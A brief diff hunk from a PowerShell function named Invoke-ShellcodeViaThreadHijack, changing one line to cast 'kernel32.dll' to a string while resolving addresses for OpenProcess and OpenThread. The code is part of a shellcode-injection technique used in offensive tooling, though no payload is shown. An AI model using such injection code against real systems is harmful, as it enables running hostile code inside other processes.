@@ -152,7 +152,7 @@ function Invoke-ShellcodeViaThreadHijack
     
     # Get all of our address pointers to our needed functions.
 
-    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
+    $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
 
     $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenProcess"))
     $OpenThreadAddress                  = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenThread"))
